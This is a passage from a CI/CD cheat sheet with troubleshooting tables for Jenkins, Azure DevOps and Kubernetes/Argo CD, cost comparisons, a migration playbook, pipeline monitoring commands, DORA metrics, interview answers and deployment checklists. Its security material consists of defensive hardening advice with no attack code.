| The agent never picks up the job | no agent in the pool, or the `demands` don't match | Pool → Agents → check online + capabilities |
| ⭐ "No agents are available" | the pool is empty or all agents are offline | check `demands:`; a self-hosted agent's capabilities must include them |
| The build works on `ubuntu-latest` and fails on `windows-latest` | bash vs PowerShell, paths, line endings | `pwsh:` vs `bash:` explicitly; `$(Agent.OS)` conditions |
| A deployment job's gate never clears | the environment check is pending | Environments → production → Checks → look at the pending approval |
| `##vso[task.setvariable]` doesn't work in a container step | the logging command isn't reaching the agent | use `$env:` + the task's own output mechanism |
| The YAML pipeline runs the CLASSIC one's steps | both are configured for the same branch | disable one trigger. `az pipelines show --id X` and check the trigger. |
| ⭐ `Failed to queue build: the branch policy requires …` | a branch policy is blocking | `az repos pr policy list --id N`; the "Build" policy must point at the right definition |
| The Key Vault variable group has no secrets | the SP lacks `get`/`list` on the vault | Key Vault → Access policies → the ADO service principal |
| WIF: "The federated credential was not found" | the subject doesn't match | the subject is `<orgId>/<projectId>/<environment>`; check `az devops service-endpoint show` |

### 14.4 🔨 Jenkins

| Symptom | Cause | Fix |
|---|---|---|
| ⭐ `Rejected by the sandbox` / `Scripts not permitted to use method …` | Groovy sandbox | Manage Jenkins → In-process Script Approval → approve. ⭐ Better: avoid the method. |
| `java.io.NotSerializableException: …` | a non-serializable object in a CPS-transformed method | assign it to a local inside a `@NonCPS` method, or wrap the call |
| The pod agent never starts | the cloud config, the image, the service account, or the node's resources | Jenkins → Nodes → the agent's log; `kubectl -n jenkins describe pod` |
| ⭐ `Container … is not valid` | the `container()` name doesn't match the pod template | names must match EXACTLY; `defaultContainer` too |
| `No such DSL method 'x' found among steps` | the plugin isn't installed, or the shared library isn't loaded | Pipeline Syntax → the step list; check `@Library` resolved |
| ⭐ `WorkflowScript: 7: Invalid stage name` | a stage name with a `'` or a `${}` in declarative | stage names are strings, not GStrings in declarative |
| The build runs on the CONTROLLER | `agent any` + `numExecutors > 0` | set `numExecutors: 0`, `mode: EXCLUSIVE` |
| ⭐ `input` times out and the build FAILS | the default is a failure, not an abort | catch `FlowInterruptedException`; mark ABORTED explicitly |
| The credentials aren't available in a step | wrong scope (folder vs global), or a different agent | Credentials → check the scope; `withCredentials` inside the right stage |
| `hudson.AbortException: script returned exit code N` | a shell command failed | expected. Read the output above it. |
| ⭐ The workspace is stale from the last build | `cleanWs()` isn't in `post` | add it. Also `deleteDirs: true`. |
| The multibranch job didn't discover a new branch | the scan hasn't run | "Scan Multibranch Pipeline Now"; check the branch-discovery traits |
| A fork PR ran with real credentials | ⛔ `trustEveryone` or the default trust | `trust(class: 'jenkins.scm.impl.trustNobody')` |
| ⭐ "Queue is stuck" / builds wait forever | all executors busy, or a `lock()` held by a hung build | `jcli list-jobs`; check the Lockable Resources page; abort the holder |
| The shared library version didn't update | Jenkins caches it per build | `@Library('x@tag')`; the "Cache fetched versions" setting; clear it |
| ⭐ Jenkins is slow / the UI lags | the fingerprinting, the build history, or a plugin leak | Manage Jenkins → System Log; thread dump; disable build recorders you don't use |
| `OutOfMemoryError: Java heap space` | `JAVA_OPTS=-Xmx` too low for the job count | raise it in values.yaml; but first reduce the number of concurrent builds |
| A plugin update broke everything | ⭐ no staging instance | always test in a staging Jenkins first; keep a baked image with pinned versions |
| The controller restarted and lost config | settings were in the UI, not JCasC | ⭐ JCasC + a monthly `/export` diff |

### 14.5 Kubernetes / Argo CD / Rollouts

| Symptom | Cause | Fix |
|---|---|---|
| ⭐ `ImagePullBackOff` | the digest is wrong, the SA lacks a pull secret, the registry is private | `kubectl describe pod` → the Events. `kubectl get secret regcred`. Check `imagePullSecrets`. |
| `ErrImagePull` with a digest | the digest doesn't exist in that registry/repo | `crane manifest $IMAGE@$DIGEST` — does it resolve? |
| ⭐ The pod is `Running` but not `Ready` | the readiness probe fails | `kubectl describe pod` → probe failures. `kubectl exec … -- curl -v localhost:8080/ready` |
| `CrashLoopBackOff` | the app exits | `kubectl logs POD --previous`. Usually config, a missing env var, or a DB it can't reach. |
| `OOMKilled` | the memory limit is too low | raise `limits.memory`. ⭐ Check for a leak first: `kubectl top pod`, a heap dump. |
| The pod is `Pending` | insufficient resources, a node selector, a PVC unbound, a taint | `kubectl describe pod` → Events. `kubectl get nodes -o wide`, `kubectl get pvc`. |
| ⭐ `CreateContainerConfigError` | a ConfigMap/Secret key referenced doesn't exist | `kubectl describe pod`; check the `envFrom`/`valueFrom` references |
| Helm: `UPGRADE FAILED: … timed out waiting` | `--wait` with a probe that never passes | `helm history X`; `kubectl describe`; ⭐ `--atomic` rolls it back for you |
| ⭐ Helm: `invalid ownership metadata` | the resource exists and wasn't created by Helm | `kubectl annotate … meta.helm.sh/release-name=X meta.helm.sh/release-namespace=Y` + `app.kubernetes.io/managed-by=Helm` |
| Argo CD: permanently `OutOfSync` | ⭐ a resource is mutated by another controller | add it to `ignoreDifferences` (jsonPointers or jqPathExpressions) |
| Argo CD: `Synced` but nothing changed | the path/values are wrong; the Application points at the wrong revision | `argocd app manifests` — is the digest there? |
| ⭐ Argo CD: a sync loop (constantly Syncing) | Argo CD and Argo Rollouts both writing `replicas` | `ignoreDifferences` on `/spec/replicas` and `/status` |
| Argo CD: `ComparisonError` | the repo isn't reachable, the path is wrong, or the credentials expired | `argocd app get X --hard-refresh`; `argocd repo list` |
| ⭐ Argo CD: `Healthy` but the pods are old | the Rollout is paused, or the sync didn't include it | `kubectl argo rollouts get rollout X -n NS` |
| Rollouts: stuck at `Paused` | an indefinite `pause: {}` with no `duration` | `kubectl argo rollouts promote X -n NS` |
| ⭐ Rollouts: the analysis is `Inconclusive` | not enough traffic | a load generator (capstone Task C.3); or `promote` with a reason |
| Rollouts: `Degraded` with no clear reason | an AnalysisRun failed, or the new RS won't become healthy | `kubectl argo rollouts get rollout X -n NS` → read the tree; `kubectl get analysisrun -o yaml` |
| ⭐ Rollouts: traffic isn't splitting | the ingress/ServiceMesh config, or the `-canary`/`-stable` Services are missing | check `trafficRouting:` and that BOTH Services exist with the right selectors |
| Kyverno: everything is denied | a policy in `Enforce` with `failurePolicy: Fail` and Kyverno is down | `kubectl -n kyverno get pods`. ⭐ That's the SAFE behaviour; fix Kyverno, don't disable the policy. |
| ⭐ Kyverno: "no matching signatures" for a validly signed image | the issuer or the identity doesn't match | print the certificate: `cosign verify … \| jq '.[0].optional'`; compare with the policy |
| A `kubectl apply` is rejected | a Kyverno/OPA policy | read the webhook message — it names the policy and the rule |

---

<a name="15--cost"></a>
## 15 · Cost

```
🐙 GITHUB ACTIONS
  · Free (public repos): UNLIMITED minutes. ⭐ open source is free.
  · Free (private repos): 2,000 min/month, 500 MB of artifacts, 20 concurrent jobs
  · Team:   3,000 min/month
  · Enterprise: 50,000 min/month
  · beyond: $0.008/min Linux, $0.016/min Windows, $0.08/min macOS
  · ⭐ MULTIPLIERS: a 2× runner is 2× the minutes; a 4× is 4×.
  · storage: $0.008/GB-month artifacts, $0.02/GB-month cache
  · ⭐⭐ THE CHEATS:
      · cache aggressively (a 24min → 6min build is a 75% cost cut)
      · `cancel-in-progress: true` on PRs
      · `paths:` filters so a docs change doesn't build 5 services
      · `timeout-minutes` on everything (a hung job bills for its full timeout)
      · `retention-days: 7` on artifacts, not 90
      · Linux runners, not macOS, unless you need macOS
      · ⭐ `fail-fast: false` costs MORE (all legs finish). Weigh it.

🔷 AZURE DEVOPS
  · Free: 5 users, 1,800 min/month (Microsoft-hosted), 1 self-hosted job
  · ⭐⭐ FLAT-RATE PARALLEL JOBS: ~$40/month per parallel job, UNLIMITED minutes
  · beyond the free tier, per-minute: $0.008/min Linux
  · ⭐⭐ THE BREAK-EVEN: at >~5,000 min/month per parallel job, flat-rate wins.
      At >15,000 min/month it wins decisively.
  · Basic plan: ~$6/user/month; Basic + Test Plans: ~$52/user/month
  · ⭐ Azure Artifacts: free up to 2 GB, then per GB
  · ⭐⭐ THE CHEAT: one flat-rate parallel job with 8 self-hosted agents behind it
      can be cheaper than 8 GitHub runners.

🔨 JENKINS
  · Software: $0. Plugins: $0. LTS: $0.
  · ⭐⭐ THE REAL COST: 0.2–0.5 FTE of platform engineering.
      Upgrades, plugin compatibility, security patches, agent capacity,
      disk, backups, the controller JVM, the inevitable "Jenkins is slow".
  · infrastructure: the controller (2 CPU / 4 GB minimum) + the agents
  · at 30 pods × 4 CPU × 8 GB for 8 hours/day ≈ 3 nodes ≈ $250–400/month on AWS
  · ⭐⭐ THE HONEST COMPARISON:
      A 50-person org doing 3,000 builds/month:
        GitHub Actions: ~$400/month + 0.05 FTE
        Azure DevOps:   ~$200/month (5 flat-rate jobs) + 0.05 FTE
        Jenkins:        ~$350/month infra + 0.3 FTE  ← ⭐ $4,000+/month at loaded cost
      Jenkins wins ONLY when: you need a plugin nothing else has, you must be
      fully on-prem/air-gapped, you already have the platform team, or you have
      a large existing estate where migration costs more than maintenance.
  · ⭐⭐ AND THE THIRD OPTION: CloudBees CI (supported Jenkins) — the same
      Jenkins with SLAs, at roughly the same total cost as the FTE you'd spend.

💰 THE COST QUESTION THAT MATTERS MOST:
   "What does a 10-minute reduction in build time cost, and what does it save?"
   50 engineers × 6 builds/day × 10 min = 50 engineer-hours/day.
   At $60/h loaded, that's $3,000/day — $60,000/month.
   ⭐⭐ A $500/month cache infrastructure that saves 10 minutes per build
      pays for itself 120× over. NEVER optimise CI minutes before you've
      optimised engineer waiting minutes.
```

---

<a name="16--migration-playbook"></a>
## 16 · Migration playbook

```
MIGRATING Jenkins → GitHub Actions (the most common)
────────────────────────────────────────────────────
1. INVENTORY     every job: name, trigger, what it does, who owns it, how often
                 it runs, its last 30 results. ⭐ You will find jobs nobody has
                 run in 3 years. Delete those first — it's 30% of the work.
2. CLASSIFY      · green + used → migrate
                 · red + used   → FIX, then migrate (never migrate a broken job)
                 · green + unused → ⭐⭐ SUSPECT. "Green while broken" — no
                   timeout, no `set -e`, `allowEmptyResults: true`. Verify it
                   actually tests anything BEFORE spending time migrating it.
                 · anything with a `docker.sock` mount → ⭐ migrate to Kaniko
3. EXTRACT       move the logic from Groovy into shell scripts under ci/.
                 ⭐ This is 70% of the real work and it pays off even if you
                   never finish migrating.
4. ORDER         by risk, not by ease: migrate a LOW-RISK, HIGH-VISIBILITY job
                 first. A docs build. Get a win, learn the platform.
                 ⛔ Do NOT migrate the production deploy first.
5. SHADOW        run both. Compare the artifacts, the test results, the timings.
                 ⭐ Two weeks minimum.
6. CUT OVER      disable the Jenkins trigger, enable Actions. Keep the Jenkins
                 job for a month, renamed `-legacy`, with its build history
                 archived to object storage.
7. DECOMMISSION  ⭐ only when NOTHING depends on it. Check: webhooks, upstream
                 triggers, cron, human bookmarks, dashboards, alerts.

MIGRATING Azure DevOps classic → YAML
──────────────────────────────────────
See §5.3. The six steps: export, audit tasks, extract the inline scripts,
shadow-run, ⭐⭐ ROTATE (not migrate) the secrets, cut over.

MIGRATING any tool → GitOps
───────────────────────────
⭐ This is the migration that matters, and it's independent of the CI tool.
1. Put the manifests in Git (a config repo).
2. Install Argo CD. Create Applications in AUTO-SYNC for dev only.
3. ⭐ Let CI keep deploying to staging and production (push-based) for a while.
   Argo CD watches and reports drift. Fix the drift.
4. When dev is boring and reliable, enable auto-sync for staging.
5. Then flip production to MANUAL sync in Argo CD, and REMOVE the cluster
   credentials from CI. ⭐⭐ That's the moment it becomes GitOps.
6. Add Kyverno policies LAST — after everything is compliant, or you'll block
   your own deploys on day one.
```

---

<a name="17--observability-of-the-pipeline-itself"></a>
## 17 · Observability of the pipeline itself

```bash
# ⭐ THE CI PLATFORM IS TIER-4 INFRASTRUCTURE. Monitor it like one.

# ── Jenkins (the Prometheus plugin) ─────────────────────────────
curl -s -u admin:$TOKEN "$JENKINS_URL/prometheus" | head -30
# jenkins_health_check_score
# jenkins_executor_total / jenkins_executor_used / jenkins_executor_free
# jenkins_job_count / jenkins_job_building_count
# jenkins_node_online_value / jenkins_node_offline_value
# jenkins_queue_size_value / jenkins_queue_blocked_value
# jenkins_job_buildable_duration_seconds / jenkins_job_building_duration_seconds
# jenkins_job_queuing_duration_seconds
# jenkins_job_wait_time_duration_seconds        ← ⭐⭐ THE ONE THAT MATTERS
# jenkins_tests_total / jenkins_tests_failed / jenkins_tests_skipped
# jenkins_scm_checkout_duration_seconds
kubectl -n monitoring apply -f - <<'EOF'
apiVersion: monitoring.coreos.com/v1
kind: PodMonitor
metadata: {name: jenkins, namespace: monitoring, labels: {release: kps}}
spec:
  namespaceSelector: {matchNames: [jenkins]}
  selector: {matchLabels: {'app.kubernetes.io/name': 'jenkins'}}
  podMetricsEndpoints:
    - port: http
      path: /prometheus
      interval: 60s
      basicAuth:
        username: {secret: {name: jenkins-metrics, key: user}}
        password: {secret: {name: jenkins-metrics, key: token}}
EOF

# ── GitHub Actions (the API; no native Prometheus) ──────────────
gh api repos/3558Bhk/shop/actions/runs --paginate \
  --jq '.workflow_runs[] | [.name, .conclusion, .run_started_at, .updated_at] | @tsv' \
  | awk -F'\t' '{print "pipeline_build_total{tool=\"github-actions\",result=\""$2"\"} 1"}' \
  > gha.prom
# ⭐ the billing API:
gh api /orgs/3558Bhk/settings/billing/actions --jq '{total_minutes_used, total_paid_minutes_used, included_minutes, minutes_used_breakdown}'
gh api repos/3558Bhk/shop/actions/cache/usage
# ⭐⭐ OR just use the emitter script (capstone §6.2) from inside each workflow.

# ── Azure DevOps ────────────────────────────────────────────────
az pipelines list-runs --id 42 --top 100 -o json \
  | jq -r '.[] | "pipeline_build_total{tool=\"azure-devops\",result=\"\(.result)\"} 1"'
# ⭐ Azure Monitor has native DevOps metrics:
#    AzureDevOpsMetrics → BuildCompletion, StageDuration, QueueWait
# ⭐ and the "Query Azure Monitor alerts" environment check turns an SLO
#    burn-rate alert into a deployment gate. That's the cleanest automated
#    production gate that exists in any of the three tools.

# ── THE PUSHGATEWAY PATTERN (what actually works) ───────────────
# ⭐ a Pushgateway is the right answer for CI metrics because builds are
#    SHORT-LIVED — Prometheus cannot scrape a process that ends.
# ⭐⭐ and `honorLabels: true` on the ServiceMonitor is REQUIRED, or
#    Prometheus overwrites your `tool` and `repo` labels.
```

```yaml
# ⭐ the pipeline alerts that matter (see capstone §6.4 for the full set)
- alert: CIPipelineDown            # a CI tool is tier-4 infra
- alert: BuildFailureRateHigh      # >30% for 30m — almost never 100 real bugs
- alert: BuildDurationRegression   # 1.5× last week — usually a lost cache
- alert: CacheHitRateCollapsed     # <0.3 hits per build
- alert: QueueWaitTooLong          # ⭐ Jenkins: jenkins_job_queuing_duration p95 > 5m
- alert: DeploymentFrequencyCollapsed   # ⭐ a HEALTH alert, not an incident
- alert: RollbackRateHigh          # the DORA change-failure-rate signal
- alert: PromotionPRBacklog        # >5 unmerged promotion PRs
- alert: ArgoCDOutOfSyncForTooLong
- alert: ArgoCDAppDegraded
- alert: RolloutStuck              # paused >1h
- alert: KyvernoBlockingDeploys    # >0.5 rejects/s for 10m
- alert: SecretRotationOverdue     # >90 days
- alert: PipelineMetricsAbsent     # ⭐⭐ the emitter stopped working
```

---

<a name="18--dora-metrics"></a>
## 18 · DORA metrics

```
⭐⭐ THE FOUR METRICS — and the published thresholds

1. DEPLOYMENT FREQUENCY       how often you deploy to production
   elite:   on demand (multiple per day)
   high:    between once per day and once per week
   medium:  between once per week and once per month
   low:     between once per month and once every six months

2. LEAD TIME FOR CHANGES      commit → running in production
   elite:   less than one hour
   high:    between one day and one week
   medium:  between one week and one month
   low:     between one month and six months

3. CHANGE FAILURE RATE        % of production deploys causing an incident
   elite:   0–15%
   high:    16–30%
   medium:  16–45%      ⚠️ the published bands overlap; quote carefully
   low:     46–60%

4. FAILED DEPLOYMENT RECOVERY TIME (was "MTTR")
   elite:   less than one hour
   high:    less than one day
   medium:  between one day and one week
   low:     between one week and one month

⭐⭐ THE THREE TRAPS:
   TRAP 1: they are DIAGNOSTIC, not TARGETS.
     A target on deployment frequency produces frequent trivial deployments.
     A target on lead time produces small, unreviewed changes.
     Use them to find the CONSTRAINT, then fix the constraint.

   TRAP 2: high frequency + high failure rate is the DANGEROUS quadrant.
     ⛔ The instinct is to slow down. That converts it into "low frequency +
        low failure rate", which feels safe and isn't — you've just batched
        the risk. ⭐ The right response is to strengthen the canary analysis.

   TRAP 3: a metric that looks bad may be a CONTROL WORKING.
     A p95 lead time of 30h with a p50 of 1h42m usually means changes merged
     on Thursday wait for Monday. That's the deployment window doing its job.
     Investigate before optimising.

⭐ THE FIFTH METRIC NOBODY TRACKS: THE WAIT.
   pipeline_queue_wait_seconds — how long a build waits for a machine.
   ci_promotion_pr_seconds     — how long a promotion PR waits for a human.
   ⭐ Total lead time = queue + build + test + review wait + deploy + soak.
     The WAIT is usually 80% of it, and it's the part engineers can't see
     from inside a build log.
```

---

<a name="19--interview-lines-"></a>
## 19. ⭐⭐ Interview lines

```
ON THE TOOLS
"Which is best?" → "They're the same shape — checkout, test, build, push,
 deploy — and the differences are structural, not qualitative. Azure DevOps
 has real stages and the best approval gates. GitHub Actions has no stages at
 all; you emulate them with `needs:` plus `environment:`, and it has by far the
 largest ecosystem. Jenkins is Groovy, which means it can do anything and that
 every security property is your responsibility. I'd pick based on where the
 code already lives and who has to operate it, not on feature lists."

"Have you used Jenkins in production?" → "Yes — and the important part isn't
 the Jenkinsfile syntax, it's `numExecutors: 0` on the controller, ephemeral
 Kubernetes pod agents with `automountServiceAccountToken: false`, Kaniko
 instead of a docker.sock mount, `trustNobody()` on fork PRs, folder-scoped
 credentials so a dev job can't see a production secret, and JCasC so the whole
 instance is reproducible in ten minutes — which is also the honest answer to
 'how do you make Jenkins highly available?' You don't. You make it fast to
 rebuild."

ON ARCHITECTURE
"Why GitOps?" → "Because the alternative is that CI holds a kubeconfig, which
 means a compromised CI is a compromised cluster. With GitOps, CI's only
 credential is write access to a config repo, and the promotion is a pull
 request — so the approval gate, the audit trail and the rollback mechanism are
 the same object. And the cluster reconciles continuously, which means `kubectl
 edit` during an incident gets reverted in three minutes instead of becoming
 permanent undocumented drift."

"How do you deploy the same artifact to three environments?" → "You build once
 and promote by digest. The digest is content-addressed, so the bytes that ran
 in dev are provably the bytes that run in production. Environment differences
 live in Helm values and ConfigMaps, not in the image. If you're rebuilding per
 environment, you haven't tested what you ship."

"How do you roll back?" → "Four paths, in order of correctness. Argo Rollouts
 `abort` if a canary is mid-flight — seconds, because the stable ReplicaSet was
 never torn down. `undo --to-revision` for the previous revision, which creates
 drift you must immediately fix in Git. `git revert` on the config repo, which
 is the correct one and goes through progressive delivery again — because a
 rollback is a deploy. And the break-glass `kubectl set image` with auto-sync
 disabled, which I've used once and which left drift that Kyverno caught the
 next morning when it refused to schedule a pod against a `:latest` tag."

ON SECURITY
"How do you secure a pipeline?" → "Start from the five attacks that actually
 happen. `pull_request_target` with a checkout of the PR's code — that's
 'pwn request', and it hands a fork your write token. Script injection through
 an untrusted expression into a `run:` — the fix is passing values through the
 environment, never the command line, and in Jenkins using single-quoted `sh`
 with `withEnv`. A self-hosted runner on a public repo, which is remote code
 execution on your hardware. Cache poisoning, where a PR writes a cache key that
 main later restores and executes. And an over-permissioned default token — so
 `permissions: {}` and add only what's needed. Then CODEOWNERS on the pipeline
 files, because whoever can edit the workflow can deploy."

"Why verify signatures in the cluster and not just sign in CI?" → "Because the
 pipeline is the thing being attacked. A control that lives in the pipeline is a
 control the attacker controls once they've compromised it. Kyverno's
 `verifyImages` at admission means that even with full registry write access, an
 attacker can't deploy — and the identity condition matters more than the
 signature: `cosign verify` proves someone signed it, `--certificate-identity`
 proves it was the right pipeline. I tested this by signing an image from my
 laptop with a valid GitHub Actions identity and watching the cluster reject it
 because the subject didn't match the repo's `ci.yml` on `main`."

ON PROGRESSIVE DELIVERY
"How do you know a canary is healthy?" → "An Argo Rollouts AnalysisTemplate
 querying Prometheus at every step, with six to eight metrics — error rate,
 canary-versus-stable errors, p99 latency both absolute and relative, CPU
 saturation, restarts and OOMs, a blackbox probe, and a smoke-test Job. The
 tuning is the hard part: never judge a ratio without a minimum sample size,
 because one error in three requests is 33% and it's also noise; use both an
 absolute ceiling and a relative delta for latency; `failureLimit: 2` over
 `count: 5` for app metrics but 1 for restarts; and `initialDelay` of two to
 three minutes because judging the first minute of a canary measures JVM warm-up
 rather than the version. And insufficient data must be inconclusive — which
 pauses for a human — never successful."

ON METRICS
"What are your DORA numbers?" → "Deployment frequency ~14/week, lead time p50
 1h42m, change failure rate 8%, MTTR 4 minutes. But the interesting number was
 on the per-tool comparison table: Jenkins had a p95 queue wait of 3m41s against
 GitHub's 8 seconds, which turned out to be `containerCap: 10` with two worker
 nodes — the pods were queueing in Kubernetes, not in Jenkins. Same table showed
 a flaky-test rate five times higher, which the library-version inventory job
 traced to three jobs pinned to an old shared-library tag with a race in a
 helper. Three findings from one table."

ON THE HARD QUESTIONS
"How do you make Jenkins highly available?" → "You can't. It's a single JVM with
 a single PVC and no supported clustering. What you can do is make the rebuild
 fast and tested: JCasC for every setting, a baked controller image with pinned
 plugin versions, job definitions generated by Job DSL from Git, and the secrets
 directory backed up nightly with a quarterly restore DRILL — because a backup
 you've never restored isn't a backup. Ten minutes to a working controller is
 the resilience story, and it's honest."

"Your pipeline takes 40 minutes. What do you do?" → "Measure before changing
 anything. Get the per-step timings, and you'll usually find it's three things:
 a cold dependency cache, a build that recompiles everything, and a test suite
 that runs serially. Cache the dependency directories keyed on the lockfile
 hash — a 24-minute build went to 6 with `type=gha` and a per-service scope.
 Split the tests into a matrix. Move the slow integration tests to a separate
 job that only runs on main. Only then consider a bigger runner, which costs
 money and fixes nothing if the bottleneck is a cache miss."

"A developer says the deployment gate is slowing them down." → "First, is it?
 Get the number — `ci_promotion_pr_seconds` p50. If a production promotion PR
 sits for six hours, that's a real problem and the fix is usually a reviewer
 rota or an automated gate, not removing the gate. If it's ninety seconds, the
 complaint is about friction, not time, and the fix is better feedback: post the
 evidence into the PR so the reviewer isn't doing archaeology. What I won't do
 is remove the gate, because the gate is the thing that makes the other 50
 deploys a week safe."
```

---

<a name="20--the-checklists"></a>
## 20 · The checklists

### 20.1 Before you merge a pipeline change

```
□ I ran it on a branch and read the FULL log, not just the green tick
□ ⭐ `permissions:` is declared, and it's the minimum
□ ⭐ no untrusted expression inside a `run:`/`sh` command line
□ every action/task/plugin is PINNED (a SHA for Actions, a version for tasks)
□ there's a `timeout` on the job AND on any step that can hang
□ `fail-fast: false` if the matrix legs are independent
□ secrets are never echoed, never in a URL, never in a filename
□ the artifact name is unique per matrix leg
□ `if-no-files-found: error` on any upload that must produce something
□ a new secret? → it's environment-scoped, not repo-scoped, if it's for deploy
□ a new trigger? → will it fire twice, or on forks?
□ CODEOWNERS covers the file I changed
□ ⭐ I know what happens if this step FAILS — does the deploy still run?
```

### 20.2 Before you deploy to production

```
□ the artifact is the SAME digest that ran in staging
□ ⭐ the staging soak completed with no analysis failure
□ the config-repo PR diff is ONLY the digest block
□ the signature verifies (independently, in promote.sh)
□ the SBOM has no CRITICAL CVEs — or there's an accepted risk with an owner
□ the SLO burn rate is under 1×
□ no critical alert is firing
□ we're inside the deployment window
□ a change ticket exists
□ ⭐ I know the rollback command and I have typed it before
□ ⭐ I know how to PROVE the rollback worked (a smoke test, not a green pod)
□ someone else knows we're deploying
□ the on-call knows who deployed what, and when
```

### 20.3 The production CI/CD checklist (the whole system)

```
CI
  □ builds are under 10 minutes to a verdict (p50), under 25 (p95)
  □ every job has a timeout
  □ the cache-hit ratio is above 1.0 per build
  □ `fail-fast: false` everywhere it matters
  □ change-aware builds — a docs change doesn't build five services
  □ the same script runs the tests in CI and locally
  □ artifacts are immutable and named uniquely
  □ test results are published, and `allowEmptyResults` is FALSE
  □ coverage is tracked, with a ratchet, not a hard gate on day one

SECURITY
  □ `permissions: {}` and the minimum added
  □ SHA-pinned actions + Dependabot
  □ CODEOWNERS on every pipeline file
  □ OIDC/WIF for every cloud credential — no stored keys
  □ secrets environment-scoped; production in a protected environment
  □ required reviewers on production, and admins CANNOT bypass
  □ ⭐ no self-hosted runner on a public repo
  □ secret scanning with PUSH PROTECTION (not just alerts)
  □ gitleaks on the full history
  □ actionlint / semgrep on the workflows in CI
  □ ⭐ a fork-PR test that proves secrets aren't reachable
  □ Jenkins: numExecutors 0, sandbox on, no approved signatures without review,
    folder-scoped credentials, authorize-project, trustNobody()

SUPPLY CHAIN
  □ every image signed
  □ ⭐⭐ the cluster VERIFIES the signature, with an identity condition
  □ `mutateDigest: true` so the verified digest is what runs
  □ SBOM attached as a signed attestation
  □ provenance attached
  □ ⭐ a NIGHTLY scan of what's RUNNING, not just what's being built
  □ Kyverno `failurePolicy: Fail`
  □ no `:latest`, no mutable tags — enforced by policy
  □ the policy test suite runs in CI on every policy change

DELIVERY
  □ GitOps: a separate config repo, CODEOWNERS on production
  □ ⭐ CI holds NO cluster credentials
  □ build once, promote by digest
  □ auto-sync for dev/staging; MANUAL sync for production
  □ `ignoreDifferences` on /status and /spec/replicas
  □ progressive delivery with an AnalysisTemplate of ≥6 metrics
  □ ⭐ an `enough-traffic` guard so low volume is inconclusive, not healthy
  □ a load generator so the analysis is always conclusive
  □ automatic rollback on analysis failure — TESTED
  □ four documented rollback paths, one of which you've rehearsed
  □ Kyverno policies for probes, resources, security context, replica bounds

OBSERVABILITY
  □ the pipeline emits metrics with a documented contract
  □ the Pushgateway is scraped with `honorLabels: true`
  □ the DORA dashboard exists, with the published thresholds
  □ ⭐ the per-tool comparison table exists and someone reads it
  □ alerts on the CI platform itself (down, failure rate, duration, cache, queue)
  □ alerts on the delivery layer (Argo CD OutOfSync, Degraded, RolloutStuck)
  □ a DeploymentFrequencyCollapsed alert — because it's a health signal
  □ runbooks for: canary failed, OutOfSync, Kyverno blocking, CI down,
    secret leaked, emergency rollback, promotion stuck, pipeline slow
  □ ⭐⭐ a chaos day, with evidence, at least twice a year
```

---

## 🔖 The version anchors

```
🐙 GitHub Actions
   actions/checkout         v7     (SHA-pinned in production)
   actions/setup-java       v5
   actions/setup-node       v4
   actions/setup-go         v5
   actions/setup-python     v5
   actions/cache            v4
   actions/upload-artifact  v4     ⭐ immutable artifacts, unique names required
   actions/download-artifact v4
   docker/build-push-action v6
   docker/setup-buildx-action v3
   docker/login-action      v3
   dorny/paths-filter       v3
   aws-actions/configure-aws-credentials v4
   azure/login              v2
   google-github-actions/auth v2
   ubuntu-latest            = Ubuntu 24.04

🔷 Azure DevOps
   Workload Identity Federation     GA
   Microsoft-hosted ubuntu-latest   = Ubuntu 24.04
   Cache task                       @2
   AzureCLI                         @2
   PublishTestResults               @2

🔨 Jenkins
   LTS                              2.568.3
   ⭐ JAVA MINIMUM                  21     (Java 17 support ended at the 2.555 line)
   Kubernetes plugin, Job Cacher, Lockable Resources, Role-based Authorization,
   Authorize Project, OIDC Provider, Vault, Configuration as Code, Job DSL,
   Pipeline Utility Steps, Warnings NG, JUnit, HTML Publisher, Slack,
   Prometheus, Multibranch Scan Webhook Trigger

☸️ Delivery
   Kubernetes                       1.37
   Argo CD                          3.x    (Helm chart 8.x)
   Argo Rollouts                    1.8+
   Kyverno                          1.14+
   Helm                             3.17+
   ingress-nginx, cert-manager, kube-prometheus-stack

🔗 Supply chain
   cosign (sigstore)                2.4+
   syft                             1.x
   grype                            0.8x
   trivy                            0.5x
   crane (go-containerregistry)
   Kaniko                           v1.23+
   kubeconform, conftest, actionlint, shellcheck, hadolint, semgrep, gitleaks

📅 Checked: September 2026
```

---

## 🔚 The last thing

```
⭐⭐ IF YOU REMEMBER ONLY FIVE SENTENCES FROM THIS WHOLE PATH:

1. Build once, promote by digest. If the image differs per environment, you
   haven't tested what you ship.

2. CI holds no cluster credentials. It writes a digest to Git, and that's all.
   A compromised pipeline then cannot deploy — it can only open a pull request.

3. Verify in the cluster, not in the pipeline. The pipeline is the thing being
   attacked. Signing proves someone signed it; the IDENTITY condition proves it
   was the right pipeline.

4. Never judge a ratio without a denominator. One error in three requests is
   33%, and it's also noise. Insufficient data must be inconclusive — which
   pauses for a human — never successful.

5. The pipeline is infrastructure. Monitor it, alert on it, run a chaos day
   against it, and keep a runbook. An unmeasured pipeline is a pipeline nobody
   can improve, and an untested rollback is not a rollback.

Everything else is syntax.
```

---

## Where next

| You want | Go to |
|---|---|
| ⏱️ The hour-by-hour plan | [00-ONE-DAY-MASTER-PLAN.md](./00-ONE-DAY-MASTER-PLAN.md) |
| 📖 The theory behind every line here | [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) |
| 🔷 Azure DevOps, in full | [02-CASE-1-azure-devops.md](./02-CASE-1-azure-devops.md) |
| 🐙 GitHub Actions, in full | [03-CASE-2-github-actions.md](./03-CASE-2-github-actions.md) |
| 🔨 Jenkins, in full | [04-CASE-3-jenkins.md](./04-CASE-3-jenkins.md) |
| 🏆 The whole system, end to end | [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) |
| 📁 The index | [README.md](./README.md) |
| ☸️ Kubernetes | [../kubernetes-learning-path/](../kubernetes-learning-path/) |
| 🐳 Docker | [../docker-learning-path/](../docker-learning-path/) |
| 📈 Monitoring and alerting | [../monitoring-alerting-learning-path/](../monitoring-alerting-learning-path/) |

---

<div align="center">

**Created by Harish Kumar Brahmandam**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Harish_Kumar_Brahmandam-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260)
[![GitHub](https://img.shields.io/badge/GitHub-3558Bhk-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3558Bhk)

🔗 LinkedIn: https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260
🔗 GitHub: https://github.com/3558Bhk

*One page. Every command. Every trap. Every interview line.*

</div>
